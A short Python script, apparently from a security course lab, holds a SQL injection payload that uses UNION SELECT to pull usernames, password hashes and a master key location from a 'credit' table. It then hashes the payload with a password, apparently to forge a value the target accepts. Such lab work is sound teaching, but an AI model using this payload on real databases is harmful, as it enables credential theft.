import hashlib

payload = "doesnotexist' UNION SELECT null, null, uname, passwd_sha256, null, hex(master_key_loc), null FROM credit LIMIT 1 OFFSET 5 --"
password = "cs177"
print(hashlib.sha256((payload + password).encode()).hexdigest())